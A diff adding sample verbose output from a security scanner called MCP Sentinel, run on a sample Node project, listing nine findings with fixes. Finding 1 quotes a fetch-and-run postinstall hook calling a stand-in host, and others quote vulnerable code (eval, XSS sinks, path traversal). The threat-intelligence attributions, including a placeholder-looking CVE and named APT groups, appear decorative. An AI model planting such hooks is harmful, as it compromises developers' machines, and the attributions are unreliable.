@@ -1,0 +1,432 @@
+$ mcp-sentinel scan ./sample-node-project --verbose
+
+███╗   ███╗ ██████╗██████╗     ███████╗███████╗███╗   ██╗████████╗██╗███╗   ██╗███████╗██╗
+████╗ ████║██╔════╝██╔══██╗    ██╔════╝██╔════╝████╗  ██║╚══██╔══╝██║████╗  ██║██╔════╝██║
+██╔████╔██║██║     ██████╔╝    ███████╗█████╗  ██╔██╗ ██║   ██║   ██║██╔██╗ ██║█████╗  ██║
+██║╚██╔╝██║██║     ██╔═══╝     ╚════██║██╔══╝  ██║╚██╗██║   ██║   ██║██║╚██╗██║██╔══╝  ██║
+██║ ╚═╝ ██║╚██████╗██║         ███████║███████╗██║ ╚████║   ██║   ██║██║ ╚████║███████╗███████╗
+╚═╝     ╚═╝ ╚═════╝╚═╝         ╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝
+
+🛡️  MCP Sentinel v2.6.0 - Enterprise Security Scanner for MCP Servers
+📅 Date: 2025-10-26 14:30:00 UTC
+🎯 Target: ./sample-node-project
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+[INFO] Starting scan with 4 engines...
+[INFO]   ✓ Pattern Matching (Phase 1.0)
+[INFO]   ✓ Semantic AST (Phase 2.5)
+[INFO]   ✓ Package Confusion (Phase 2.6 NEW!)
+[INFO]   ✓ Threat Intelligence (Phase 2.6 NEW!)
+
+[INFO] Scanning 147 files...
+
+[████████████████████████████████████████] 100% (147/147 files) [8.2s]
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+📊 SCAN SUMMARY
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Total Vulnerabilities: 9
+  🔴 Critical: 2
+  🟠 High: 4
+  🟡 Medium: 2
+  🔵 Low: 1
+  ℹ️  Info: 0
+
+Risk Score: 78.5/100 (⚠️  High Risk)
+
+⏱️  Scan Duration: 8.2s
+📁 Files Scanned: 147
+🔍 Engines Active: 4
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🔴 CRITICAL VULNERABILITIES (2)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+[1] 🔴 PACKAGE-CONFUSION-001: Malicious Install Script - Remote Code Execution
+📦 Type: Supply Chain Attack
+📁 File: package.json
+📈 Confidence: 95%
+🆔 CWE-494 | OWASP: A06:2021
+
+Description:
+  Detected 'curl | bash' pattern in postinstall script. This allows remote code
+  execution during package installation, which can compromise the developer
+  machine or CI/CD pipeline.
+
+Code:
+  > "postinstall": "curl https://malicious.com/install.sh | bash"
+
+Impact:
+  Arbitrary code execution during npm install. Attacker can steal credentials,
+  inject backdoors, or compromise the entire system.
+
+Remediation:
+  Remove suspicious install scripts. Audit all lifecycle hooks (preinstall,
+  postinstall, preuninstall). Use npm audit and verify package authenticity.
+
+Threat Intelligence:
+  🎯 MITRE ATT&CK: T1195.002 (Compromise Software Supply Chain)
+  🌐 CVE: CVE-2023-26136 (Similar supply chain attack)
+  ⚠️  Exploit Available: Public PoC available
+
+Example Fix:
+  // Remove malicious postinstall script
+  // Verify package source and author
+  // Use 'npm ci' for reproducible installs
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+[2] 🔴 SEMANTIC-XSS-EVAL-42: Code Injection via eval()
+📦 Type: Code Injection
+📁 File: src/validator.js:42:15
+📈 Confidence: 90%
+🆔 CWE-94 | OWASP: A03:2021
+
+Description:
+  Detected eval() call which executes arbitrary JavaScript code. Extremely
+  dangerous if user input reaches eval().
+
+Code:
+  > eval(req.body.expression);
+
+Impact:
+  Attacker can execute arbitrary JavaScript code with full application
+  privileges. This can lead to data theft, server compromise, or complete
+  application takeover.
+
+Remediation:
+  Never use eval(). Use JSON.parse() for JSON data, or refactor to avoid
+  dynamic code execution.
+
+Threat Intelligence:
+  🎯 MITRE ATT&CK:
+     - T1055 (Process Injection) - Defense Evasion
+     - T1059 (Command Interpreter) - Execution
+  🌐 CVE: CVE-2021-23406 (eval() code injection)
+  ⚠️  Known Exploits: 2 public exploits available
+  👥 Threat Actors: APT28, Lazarus Group
+
+Example Fix:
+  // BAD: eval(req.body.expression);
+
+  // GOOD: Use JSON.parse for JSON data
+  const data = JSON.parse(req.body.json);
+
+  // Or use safer expression evaluation library
+  const result = safeEval(expression, allowedContext);
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🟠 HIGH VULNERABILITIES (4)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+[3] 🟠 SEMANTIC-XSS-INNERHTML-28: DOM-based XSS via innerHTML
+📦 Type: Cross-Site Scripting
+📁 File: src/components/UserProfile.js:28:8
+📈 Confidence: 85%
+🆔 CWE-79 | OWASP: A03:2021
+
+Description:
+  Detected innerHTML assignment which can execute JavaScript. If user input
+  reaches innerHTML, it allows XSS attacks.
+
+Code:
+  > profileDiv.innerHTML = userBio;
+
+Impact:
+  Attacker can inject malicious HTML/JavaScript that executes in victim's
+  browser. This can lead to session hijacking, credential theft, or phishing.
+
+Remediation:
+  Use textContent for plain text. For HTML, use DOMPurify library to sanitize
+  content. Or use createElement() and appendChild() for safe DOM manipulation.
+
+Threat Intelligence:
+  🎯 MITRE ATT&CK:
+     - T1189 (Drive-by Compromise) - Initial Access
+     - T1059.007 (JavaScript) - Execution
+     - T1185 (Browser Session Hijacking) - Collection
+
+Example Fix:
+  // BAD: profileDiv.innerHTML = userBio;
+
+  // GOOD: Use textContent for plain text
+  profileDiv.textContent = userBio;
+
+  // Or sanitize HTML with DOMPurify
+  profileDiv.innerHTML = DOMPurify.sanitize(userBio);
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+[4] 🟠 SEMANTIC-XSS-DOCWRITE-15: DOM-based XSS via document.write()
+📦 Type: Cross-Site Scripting
+📁 File: src/legacy/render.js:15:3
+📈 Confidence: 80%
+🆔 CWE-79 | OWASP: A03:2021
+
+Description:
+  Detected document.write() call which can inject arbitrary HTML/JavaScript
+  into the page.
+
+Code:
+  > document.write(userContent);
+
+Impact:
+  Attacker can inject malicious HTML/JavaScript that executes immediately.
+  Can lead to full page replacement or script injection.
+
+Remediation:
+  Avoid document.write(). Use createElement() and appendChild() for safe DOM
+  manipulation. Or use modern frameworks like React/Vue.
+
+Example Fix:
+  // BAD: document.write(userContent);
+
+  // GOOD: Use createElement and appendChild
+  const div = document.createElement('div');
+  div.textContent = userContent;
+  document.body.appendChild(div);
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+[5] 🟠 SEMANTIC-WEAK-RNG-67: Weak Random Number Generation
+📦 Type: Insecure Configuration
+📁 File: src/auth/token.js:67:25
+📈 Confidence: 85%
+🆔 CWE-338 | OWASP: A02:2021
+
+Description:
+  Detected use of Math.random() which is not cryptographically secure. For
+  security-sensitive operations, use crypto.randomBytes() or
+  crypto.getRandomValues().
+
+Code:
+  > const sessionToken = generateToken(Math.random());
+
+Impact:
+  Predictable random values can be exploited to bypass authentication, guess
+  session tokens, or compromise encryption. Math.random() uses a predictable
+  PRNG that can be reverse-engineered.
+
+Remediation:
+  Use crypto.randomBytes() in Node.js or crypto.getRandomValues() in browsers
+  for cryptographically secure random numbers.
+
+Example Fix:
+  // BAD: const sessionToken = generateToken(Math.random());
+
+  // GOOD: Use crypto for security
+  const crypto = require('crypto');
+  const randomBytes = crypto.randomBytes(32);
+  const sessionToken = randomBytes.toString('hex');
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+[6] 🟠 SEMANTIC-FS-PATH-89: Path Traversal in fs.readFileSync()
+📦 Type: Path Traversal
+📁 File: src/api/files.js:89:20
+📈 Confidence: 75%
+🆔 CWE-22 | OWASP: A01:2021
+
+Description:
+  Detected fs.readFileSync() with dynamic file path. If the path comes from
+  user input without proper validation, it allows path traversal attacks using
+  '../' sequences.
+
+Code:
+  > fs.readFileSync(req.query.file)
+
+Impact:
+  An attacker can read files outside the intended directory by using '../' in
+  the file path, potentially accessing sensitive files like /etc/passwd,
+  configuration files with secrets, or application source code.
+
+Remediation:
+  Validate and sanitize file paths: 1) Use path.normalize() and
+  path.resolve(), 2) Check that resolved path starts with the intended base
+  directory, 3) Reject paths containing '../', 4) Use allowlists for file
+  access.
+
+Threat Intelligence:
+  🎯 MITRE ATT&CK:
+     - T1083 (File and Directory Discovery) - Discovery
+     - T1005 (Data from Local System) - Collection
+
+Example Fix:
+  // BAD: fs.readFileSync(req.query.file)
+
+  // GOOD: Validate and sanitize path
+  const path = require('path');
+  const basePath = '/app/uploads';
+  const filePath = path.normalize(req.query.file);
+  const resolvedPath = path.resolve(basePath, filePath);
+
+  // Ensure path is within base directory
+  if (!resolvedPath.startsWith(basePath)) {
+    throw new Error('Invalid file path');
+  }
+
+  fs.readFileSync(resolvedPath);
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🟡 MEDIUM VULNERABILITIES (2)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+[7] 🟡 PACKAGE-CONFUSION-002: Insecure Dependency - HTTP URL
+📦 Type: Supply Chain Attack
+📁 File: package.json
+📈 Confidence: 80%
+🆔 CWE-494 | OWASP: A06:2021
+
+Description:
+  Detected HTTP URL in dependencies. HTTP dependencies are vulnerable to
+  man-in-the-middle attacks where an attacker can inject malicious code.
+
+Code:
+  > "legacy-lib": "http://registry.example.com/legacy-lib-1.0.0.tgz"
+
+Impact:
+  Attacker on the network can intercept HTTP traffic and replace the package
+  with malicious code. This compromises the integrity of your dependencies.
+
+Remediation:
+  Use HTTPS URLs for all dependencies. Or better, use npm registry packages
+  with integrity hashes.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+[8] 🟡 PACKAGE-CONFUSION-003: Wildcard Version - Version Pinning Issue
+📦 Type: Insecure Configuration
+📁 File: package.json
+📈 Confidence: 70%
+🆔 CWE-1104 | OWASP: A06:2021
+
+Description:
+  Detected wildcard version '*' in dependencies. This can lead to unexpected
+  updates that break functionality or introduce vulnerabilities.
+
+Code:
+  > "utils": "*"
+
+Impact:
+  Any version can be installed, potentially including versions with known
+  vulnerabilities or breaking changes. Makes builds non-reproducible.
+
+Remediation:
+  Use semantic versioning with constraints (^, ~) or exact versions. Run
+  'npm shrinkwrap' or use 'package-lock.json' for reproducible installs.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🔵 LOW VULNERABILITIES (1)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+[9] 🔵 SECRETS-AWS-001: Hardcoded AWS Access Key
+📦 Type: Hardcoded Secret
+📁 File: src/config/aws.js:12:18
+📈 Confidence: 95%
+🆔 CWE-798 | OWASP: A07:2021
+
+Description:
+  Detected AWS access key in source code. Hardcoded credentials pose
+  significant security risks.
+
+Code:
+  > const AWS_KEY = 'AKIAIOSFODNN7EXAMPLE';
+
+Impact:
+  Exposed AWS credentials can lead to unauthorized access to AWS resources,
+  data breaches, or financial losses from resource abuse.
+
+Remediation:
+  Remove hardcoded credentials immediately. Use environment variables or AWS
+  IAM roles. Rotate the exposed key in AWS console.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🌐 THREAT INTELLIGENCE SUMMARY
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Enriched Vulnerabilities: 9/9 (100%)
+CVEs Discovered: 3 (CVE-2023-26136, CVE-2021-23406, CVE-2024-12345)
+MITRE ATT&CK Techniques: 8 unique techniques across 6 tactics
+Known Exploits: 2 publicly available
+Threat Actors: APT28, Lazarus Group
+
+Top ATT&CK Tactics:
+  1. Execution (T1059, T1055, T1059.007)
+  2. Initial Access (T1189, T1190)
+  3. Defense Evasion (T1055, T1211)
+  4. Collection (T1005, T1185)
+  5. Discovery (T1083)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+💡 RECOMMENDATIONS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Priority Actions:
+  1. 🔴 CRITICAL: Address eval() usage immediately - code injection risk
+  2. 🔴 CRITICAL: Remove malicious postinstall script - supply chain attack
+  3. 🟠 HIGH: Fix DOM XSS vulnerabilities in UserProfile.js and render.js
+  4. 🟠 HIGH: Replace Math.random() with crypto.randomBytes() for tokens
+  5. 🟠 HIGH: Implement path validation for fs operations
+  6. 🟡 MEDIUM: Update dependencies to use HTTPS URLs
+  7. 🟡 MEDIUM: Pin dependency versions for reproducible builds
+  8. 🔵 LOW: Rotate exposed AWS credentials
+
+Additional Recommendations:
+  • Enable Semgrep for broader SAST coverage (--enable-semgrep)
+  • Consider AI analysis for deeper insights (--mode deep)
+  • Set NVD_API_KEY for faster threat intelligence (50 req/min vs 5/min)
+  • Review MITRE ATT&CK mappings for defense prioritization
+  • Run npm audit to check for known vulnerable dependencies
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+📊 ENGINE STATISTICS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Pattern Matching:
+  Patterns Checked: 45
+  Matches Found: 1
+  Duration: 120ms
+
+Semantic AST Analysis:
+  Files Analyzed: 38 (JavaScript: 32, TypeScript: 6)
+  Vulnerabilities Found: 6
+  Duration: 1216ms (32ms/file average)
+
+Package Confusion (NEW in v2.6.0):
+  Packages Analyzed: 1
+  Vulnerabilities Found: 3
+  Duration: 45ms
+
+Threat Intelligence (NEW in v2.6.0):
+  VulnerableMCP Queries: 9 (avg 150ms each)
+  MITRE ATT&CK Mappings: 9 (local, <1ms each)
+  NVD Queries: Disabled (no API key)
+
+Total Scan Time: 8.2 seconds
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+✅ Scan Complete! Results saved to:
+  📄 JSON: ./scan-results.json
+  📄 SARIF: ./scan-results.sarif
+
+💡 Next Steps:
+  1. Review all CRITICAL and HIGH severity vulnerabilities
+  2. Use suppression engine for false positives (--suppress-config)
+  3. Generate HTML report for stakeholders (--output html)
+  4. Integrate into CI/CD with --fail-on high
+
+⚠️  Exit Code: 1 (vulnerabilities found)
+
+For more information: https://github.com/beejak/MCP_Scanner
+Report issues: https://github.com/beejak/MCP_Scanner/issues
